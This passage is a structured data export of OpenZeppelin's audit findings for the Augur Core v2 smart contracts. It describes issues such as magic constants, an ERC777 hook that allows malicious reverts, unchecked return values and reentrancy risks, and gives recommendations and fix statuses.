      "content": "There are several occurrences of magic constants in the Augur code base, an issue deeply related with what is being reported in **“[M03] Undocumented mathematical operations to compute Augur payouts”**. These values make the code harder to understand and to maintain.\n\n\nThe following is a non-extensive list of some locations in the code where magic constants can be found:\n\n\n* [Line 73](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L73) in `ReputationToken.sol`\n* [Line 216](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L216) and [228](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L228) in `Market.sol`\n* [Lines 81 to 84](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L81-L84), [444 to 445](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L444-L445), [451 to 452](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L451-L452) and [460](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L460) in `Universe.sol`\n\n\nConsider defining a constant variable for every magic constant (including booleans), giving it a clear and self-explanatory name. For complex values, or in cases where defining a constant variable does not seem appropriate, consider adding an inline comment explaining how they were calculated or why they were chosen. All of this will allow for added readability, easing maintenance.\n\n\n***Update****: fixed in* [*`fe4ccb2`*](https://github.com/AugurProject/augur/commit/fe4ccb29175ef63657f86b11dd6c4ca341f1c0ae) *by defining new constant state variables and adding explanatory inline comments in the* *`Universe`* *and* *`Reporting`* *contracts.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11522",
      "title": "[L01] Lookup key strings are not centrally defined",
      "impact": "LOW",
      "content": "Known Augur contracts are tracked in the [`registry`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L78) [`mapping`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L78) of the `Augur` contract. New entries can be added by a privileged address via the [`registerContract`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L90) function, and the [`lookup`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L103) function acts as a public getter to query the registry providing a string-type key. While this registry is used by several different contracts to get the addresses of legitimate Augur contracts, the strings used as keys to query the registry are not centrally defined. The identified strings are: `\"ReputationTokenFactory\"`, `\"AuctionFactory\"`, `\"MarketFactory\"`, `\"DisputeWindowFactory\"`, `\"CompleteSets\"`, `\"UniverseFactory\"`, `\"CreateOrder\"`, `\"CancelOrder\"`, `\"FillOrder\"`, `\"Trade\"`, `\"ClaimTradingProceeds\"`, `\"Orders\"`, `\"Time\"`, `\"Cash\"`, `\"ProfitLoss\"`, `\"Map\"`, `\"Market\"` and `\"ShareToken\"`.\n\n\nThis issue does not pose a security risk, but the approach taken is very error-prone and difficult to maintain. Therefore, consider factoring out all mentioned constant strings to a single library, which can be then imported in the necessary contracts. This will ease maintenance and make the code more resilient to future changes.\n\n\n***Update****: the Augur team decided not to move forward with our recommendation, arguing that centrally defining the constants would add unnecessary complexity and some additional gas costs related to the resulting size of the contracts.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11521",
      "title": "[M09] Calls to sellCompleteSets function in FillOrder contract can be unexpectedly reverted",
      "impact": "MEDIUM",
      "content": "In the [`CompleteSets`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol), the [`sellCompleteSets`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L83) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L83) is used to burn a complete set of outcome tokens in exchange for the underlying CASH token for a given market. This function is used by the `FillOrder` contract’s [`fillOrder`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L390) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L390) [when the parameter](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L404-L405) [`_ignoreShares`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L404-L405) [is set to false](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L404-L405).\n\n\nThe `sellCompleteSets` function, in [line 100](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/CompleteSets.sol#L100) of `CompleteSets.sol`, calls the [`destroyShares`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/ShareToken.sol#L48) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/ShareToken.sol#L48) which then calls the `VariableSupplyToken` contract’s [`burn`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L22) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/token/VariableSupplyToken.sol#L22), that in turn calls the [`ERC777`](https://eips.ethereum.org/EIPS/eip-777) [hook](https://eips.ethereum.org/EIPS/eip-777) on the `_sender` if the `_sender` is an ERC820-registered contract. This can be leveraged by a malicious `_sender` by reverting transactions when `sellCompleteSets` is called. This includes any calls to the [`fillOrder`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L390) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L390) when the `_ignoreShares` parameter is set to false.\n\n\nConsider not calling the ERC777 token hooks when outcome tokens are burned by the `sellCompleteSets` function. This will eliminate the risk of a malicious party unexpectedly reverting transactions.\n\n\n***Update****: Fixed in* [*`c6eed38`*](https://github.com/AugurProject/augur/commit/c6eed38e36d2ca6f11d26175df05d9284e830936) *. The call to the* *`VariableSupplyToken`* *contract’s* *`burn`* *function no longer triggers the ERC777 hook.*",
      "summary": "\nThis bug report is about the `sellCompleteSets` function in the `CompleteSets.sol` contract, which is used by the `FillOrder` contract’s `fillOrder` function when the parameter `_ignoreShares` is set to false. This function is used to burn a complete set of outcome tokens in exchange for the underlying CASH token for a given market.\n\nThe `sellCompleteSets` function calls the `destroyShares` function which then calls the `VariableSupplyToken` contract’s `burn` function. This `burn` function calls the ERC777 hook on the `_sender` if the `_sender` is an ERC820-registered contract. This can be leveraged by a malicious `_sender` by reverting transactions when `sellCompleteSets` is called, including any calls to the `fillOrder` function when the `_ignoreShares` parameter is set to false.\n\nThe issue has been fixed in `c6eed38` by no longer triggering the ERC777 hook when the `VariableSupplyToken` contract’s `burn` function is called. This eliminates the risk of a malicious party unexpectedly reverting transactions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11520",
      "title": "[M08] Factories may unexpectedly fail to create proxies",
      "impact": "MEDIUM",
      "content": "Augur’s [factories](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories) are [`CloneFactory`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/CloneFactory.sol) contracts in charge of creating clones of minimal proxies (following [EIP 1167](https://eips.ethereum.org/EIPS/eip-1167)). The target addresses of such proxies are queried from the `Augur` contract by calling its [`lookup`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L103) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L103) with a particular key.\n\n\nA problem may arise when a key has not been registered in the `Augur` contract, since the `lookup` function always defaults to return the zero address in such case. This address will then be set as the target address of the created minimal proxy, which will therefore attempt to delegate all calls to the zero address. After wrapping the proxy with the corresponding interface, all factories call the target’s `initialize` function and expect a boolean value in return. As this value will *not* be present in the data returned by the proxy’s target contract, the transaction will be unexpectedly reverted without a clear nor informative reason.\n\n\nConsider implementing, in all factories, the necessary validations on the address returned by the [`lookup`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L103) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/Augur.sol#L103) to make sure it is different from the zero address, thus avoiding unexpected failures in Augur’s factories.\n\n\n***Update****: The Augur team decided not to move forward with our recommendation, since the transaction is reverted when calling the* *`initialize`* *function on a clone that points to the zero address.*",
      "summary": "\nThis bug report is about Augur's factories, which are CloneFactory contracts responsible for creating clones of minimal proxies. The target address of these proxies is queried from the Augur contract by calling its lookup function with a particular key. The problem is that if a key has not been registered in the Augur contract, the lookup function defaults to return the zero address, which will then be set as the target address of the created minimal proxy. When the proxy is wrapped with the corresponding interface and the target's initialize function is called, the transaction is unexpectedly reverted without a clear nor informative reason.\n\nThe Augur team was recommended to implement validations on the address returned by the lookup function to make sure it is different from the zero address, but they decided not to move forward with this recommendation as the transaction is reverted when calling the initialize function on a clone that points to the zero address.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11519",
      "title": "[M07] Unchecked return value in Ownable contract",
      "impact": "MEDIUM",
      "content": "In the [`Ownable`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol)‘s [`transferOwnership`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol#L39) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol#L39), the abstract internal function [`onTransferOwnership`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/Ownable.sol#L48) is called but the boolean value it returns is never checked. Hence, if a subclass of `Ownable` were to return `false` from `onTransferOwnership` to prevent ownership transfers, all transfers would still succeed.\n\n\nIn the Augur code base, there are no contracts currently using `onTransferOwnership` to prevent ownership transfers. Yet, it is advisable to either check the return value in a `require` statement (to prevent introducing issues in future changes) or remove the return boolean value altogether.\n\n\n*Update: fixed in* [*`5bc7904`*](https://github.com/AugurProject/augur/commit/5bc7904b257d40d8ceeb941d1ce66dff879fce0a) *. The internal* *`onTransferOwnership`* *function no longer returns a boolean flag.*",
      "summary": "\nThis bug report concerns the Augur code base. The `Ownable` contract has a `transferOwnership` function which calls an abstract internal function called `onTransferOwnership`. This function returns a boolean value, but this value is never checked. This means that if a subclass of `Ownable` were to return `false` from `onTransferOwnership` to prevent ownership transfers, all transfers would still succeed. \n\nTo prevent any issues arising in the future, it is recommended to check the return value in a `require` statement, or to remove the return boolean value altogether. The bug has now been fixed in the commit `5bc7904b257d40d8ceeb941d1ce66dff879fce0a`, and the internal `onTransferOwnership` function no longer returns a boolean flag.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11518",
      "title": "[M06] Lack of event emission when market’s dispute phase starts pacing on",
      "impact": "MEDIUM",
      "content": "Following what is stated in Augur’s whitepaper, if a market’s tentative outcome is disputed with a bond greater than 0.02% of all REP but less than 2.5% of all REP, then the market enters the waiting for next fee window to begin phase, before undergoing another dispute round. The purpose of this is simply to slow down the dispute process as the bonds get larger, therefore giving honest participants more time to crowdfund the larger dispute bond.\n\n\nThe `Market` contract implements such behavior [toggling a boolean flag called](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L207) [`disputePacingOn`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L207), which once set to `true`, will [prevent further contributions](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L161) to the market’s current tentative outcome. However, the `Market` contract never emits an event in such scenario.\n\n\nConsidering how important and sensitive this stage in a market’s dispute phase is, consider defining and emitting an event in order to effectively notify off-chain clients about it.\n\n\n***Update****: fixed in* [*`27be8c5`*](https://github.com/AugurProject/augur/commit/27be8c54fecc5f9518cb86264771bf18387a8504) *. The* *`DisputeCrowdsourcerCompleted`* *event now logs a flag that indicates whether the market’s dispute phase is pacing on.*",
      "summary": "\nThis bug report is about the Augur's whitepaper which states that if a market's tentative outcome is disputed with a bond greater than 0.02% of all REP but less than 2.5% of all REP, then the market enters the waiting for next fee window to begin phase, before undergoing another dispute round. This is to slow down the dispute process as the bonds get larger, giving honest participants more time to crowdfund the larger dispute bond. However, the `Market` contract never emits an event in such a scenario. To address this issue, developers added the `DisputeCrowdsourcerCompleted` event which logs a flag that indicates whether the market’s dispute phase is pacing on. This event will effectively notify off-chain clients about it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11517",
      "title": "[M05] Lack of input validation",
      "impact": "MEDIUM",
      "content": "Several functions in the Augur code base lack explicit checks of user-controlled parameters. While this practice is often used as a way to reduce gas costs, under no circumstances should the lack of input validation undermine security nor functionality. Some examples of issues of varying severity that steam from unsanitized input are **“[C01] All CASH tokens approved to Augur can be emptied”**, **“[L04] Externally-owned accounts can be registered as contracts in the Augur contract”** or even **“[M08] Factories may unexpectedly fail to create proxies”**.\n\n\nConsider implementing [require statements](https://solidity.readthedocs.io/en/v0.5.4/control-structures.html?#error-handling-assert-require-revert-and-exceptions) where appropriate to validate all user-controlled input. Including clear user-friendly error messages (as reported in **“[M02] Missing error messages in require statements”**) is highly recommended as well.\n\n\n***Update****: input validation has been implemented across a* [*series of commits*](https://github.com/AugurProject/augur/pull/2603/commits)*.*",
      "summary": "\nThe Augur code base is missing explicit checks of user-controlled parameters, which can lead to security and functionality issues. Examples of these issues include when all CASH tokens approved to Augur can be emptied, when externally-owned accounts can be registered as contracts in the Augur contract, and when factories may unexpectedly fail to create proxies. To prevent these issues, require statements should be implemented to validate all user-controlled input, and clear user-friendly error messages should be included. This has since been implemented across a series of commits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11516",
      "title": "[M04] Undocumented REP price auction mechanism",
      "impact": "MEDIUM",
      "content": "The [`Auction`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Auction.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Auction.sol), together with the [`AuctionToken`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/AuctionToken.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/AuctionToken.sol), implement the logic behind the built-in auction-based REP price oracle introduced in Augur Core v2. Although the logic appears to be fairly straightforward, no detailed documentation (apart from the unit tests) was found regarding how the auction is expected to work. The lack of explicit explanations about the functions’ intended behavior and the rationale behind arithmetic operations (observed throughout the entire Augur code base, as more generally described in **“[M01] Missing docstrings throughout”** and **“[M03] Undocumented mathematical operations to compute Augur payouts”**) prevent us from thoroughly assessing the correctness and security of these important mechanisms that will govern the REP price in the future.\n\n\nConsider thoroughly documenting the entire REP price auction mechanism, both in docstrings and external end-user documentation. This should greatly add to the project’s maintainability and transparency, helping future developers, users and auditors evaluate the code’s level of security and correctness.\n\n\n***Update****: fixed by removing th* *`Auction`* *contract in* [*`f641c42`*](https://github.com/AugurProject/augur/commit/f641c42c47ca22d73e1e4184f6a5bb6e387e0630) *.*",
      "summary": "\nThis bug report is about the lack of documentation for the Auction and AuctionToken contracts that are part of Augur Core v2. The contracts are responsible for implementing the logic behind the built-in auction-based REP price oracle. Without detailed documentation, it is difficult to assess the correctness and security of the mechanisms that will govern the REP price in the future. \n\nThe bug was fixed by removing the Auction contract in the commit f641c42c47ca22d73e1e4184f6a5bb6e387e0630. To ensure the security and correctness of the REP price in the future, it is suggested that the entire REP price auction mechanism be documented both in docstrings and external end-user documentation. This will help future developers, users, and auditors evaluate the code and maintain the project's transparency.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11515",
      "title": "[M03] Undocumented mathematical operations to compute Augur payouts",
      "impact": "MEDIUM",
      "content": "The Augur platform relies on a number of complex economic incentives to effectively align users’ behavior, thus preventing misuse and attacks on the system. Such incentives are mostly based on stakes and fees that users and stakeholders deposit and receive in several different scenarios. Intending to make the platform as transparent as possible, the Augur team has implemented most of the calculations for fees, bonds, stakes and payouts in their smart contracts. However, such sensitive operations were found to be undocumented, rendering them extremely hard to follow and understand. Refer to the reported issues **“[M01] Missing docstrings throughout”** and **“[L02] Use of magic constants”** for related problems.\n\n\nWhile attempts to map all calculations spread throughout the code base to the Augur’s in-progress v2 whitepaper were made, still the manual process was unreliable and error-prone. Assessing for correctness becomes difficult when there is no way to straightforwardly understand the intentions behind each calculation, regardless of their simplicity.\n\n\nSome examples of this issue can be found in:\n\n\n* `Market.sol`: lines [216](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L216), [278](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L278) and [343](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L343)\n* `Universe.sol`: lines [83 to 84](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L83-L84), [324](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L324) and calculations in functions [`getOrCacheValidityBond`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L327) , [`getOrCacheDesignatedReportStake`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L342) and [`getOrCacheDesignatedReportNoShowBond`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L358)\n* `DisputeCrowdsourcer.sol`: line [81](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L81) and several calculations made in the [`redeem`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L35) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L35)\n* `AuctionToken.sol`: line [46](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/AuctionToken.sol#L46)\n* `Auction.sol`: line [101](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Auction.sol#L101), lines [203 to 205](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Auction.sol#L203-L205)\n\n\nConsider thoroughly documenting all sensitive calculations made in the code base, making explicit the rationale behind them where appropriate. As a starting point, this can be done in inline comments and docstrings; although it is highly advisable to include references to external more-detailed end-user documentation for v2 once it is ready. All of this will greatly improve the readability of the code, which should add to the platform’s transparency and the users’ overall experience.\n\n\n***Update****: fixed across a* [*series of commits*](https://github.com/AugurProject/augur/pull/2603/commits)*.*",
      "summary": "\nThe Augur platform relies on complex economic incentives to align user behavior and prevent misuse. The Augur team has implemented many of these calculations in their smart contracts, but they were found to be undocumented. This made it difficult to understand the intentions behind each calculation, making it difficult to assess their correctness. As a result, the Augur team has proposed thoroughly documenting all sensitive calculations made in the code base. This will improve the readability of the code and add to the platform's transparency and the users' overall experience. This issue has been fixed across a series of commits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11514",
      "title": "[M02] Missing error messages in require statements",
      "impact": "MEDIUM",
      "content": "Most `require` statements in Augur contracts are lacking error messages. Consider including specific and informative error messages in all require statements, as they greatly improve code readability, making the code base more self-explanatory.\n\n\n***Update****: partially fixed across a* [*series of commits*](https://github.com/AugurProject/augur/pull/2603/commits)*.*",
      "summary": "\nA bug report was filed concerning the Augur contracts, which are used for creating decentralized prediction markets. The bug was that most `require` statements in Augur contracts were lacking error messages. This means that if an error occurs, the code does not provide any information as to what the issue is.\n\nError messages are important as they help to explain what the issue is and how it can be resolved. They also make the code more self-explanatory, which is beneficial for anyone reading through the code.\n\nThe bug has been partially fixed in a series of commits. This means that some of the `require` statements now have error messages, but not all of them. It is recommended that all `require` statements should include error messages to make the code more self-explanatory.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11513",
      "title": "[M01] Missing docstrings throughout",
      "impact": "MEDIUM",
      "content": "Most of the contracts and functions in Augur’s code base lack documentation. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. In general, docstrings should explicitly explain the purpose or intention of functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\n***Update****: fixed across a* [*series of commits*](https://github.com/AugurProject/augur/pull/2603/commits)*.*",
      "summary": "\nThis bug report is related to Augur's code base lacking documentation. Documentation is essential for reviewers to correctly assess the security and correctness of the code. Additionally, docstrings improve readability and ease maintenance. The report suggests that all functions (and their parameters) that are part of the contracts’ public API should be thoroughly documented. Furthermore, functions implementing sensitive functionality, even if not public, should be clearly documented as well. It is suggested to follow the Ethereum Natural Specification Format (NatSpec) when writing docstrings. The bug has been fixed across a series of commits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11512",
      "title": "Update: [H06] Legacy REP tokens can be migrated to child universes",
      "impact": "HIGH",
      "content": "When reviewing the originally reported **“[L07] REP token allows migration of legacy tokens after universe fork”**, finally identified as a non-issue, the Augur team uncovered a serious vulnerability that would allow legacy REP tokens to be migrated to child universes in v2. In Augur team’s words: *“This would allow v1 REP tokens to abstain from v2 forks safely and therefore bypass the v2 use-or-lose mechanism”*.\n\n\nThe fix entails allowing the migration of legacy REP tokens only in Genesis universes, and it was implemented in [`48744d6`](https://github.com/AugurProject/augur/commit/48744d6948c017dff747cf58e9efba2b6681b43e).",
      "summary": "\nA vulnerability was uncovered that would allow REP tokens from Augur v1 to be migrated to child universes in v2. This would enable users to bypass the “use-or-lose” mechanism of v2, allowing them to abstain from v2 forks safely. To fix this, the Augur team implemented a change in their codebase that only allows the migration of legacy REP tokens in Genesis universes. The fix was implemented in `48744d6` on the AugurProject/augur GitHub repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11511",
      "title": "[H05] Not following the Checks-Effects-Interactions pattern",
      "impact": "HIGH",
      "content": "[Solidity recommends the usage of the Check-Effects-Interactions Pattern](https://solidity.readthedocs.io/en/v0.5.4/security-considerations.html#use-the-checks-effects-interactions-pattern) to avoid potential vulnerabilities, such as [reentrancy](https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-107). In several locations throughout the Augur code base (*e.g.* in `Market` contract functions [`distributeInitialReportingRep`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L156), [`distributeMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L323) and [`disavowCrowdsourcers`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L415-L416)), calls to external, potentially attacker-controlled, contracts are made *before* making the necessary checks and modifications in the contract’s storage. This can potentially expose serious reentrancy vulnerabilities, as discussed in the **“[H04] Reentrancy vulnerabilities in Market contract”** issue.\n\n\nStrictly following the [Check-Effects-Interactions](https://solidity.readthedocs.io/en/v0.5.4/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern is of utmost importance in systems like Augur where most of the token transfers involve ERC777-like tokens, which explicitly call hook functions in the sender and receiver of each transfer operation. Therefore, the development team must ensure all interactions with external contracts are performed after all checks and state changes are made.\n\n\n***Update****: Some instances of this issue have been fixed in* 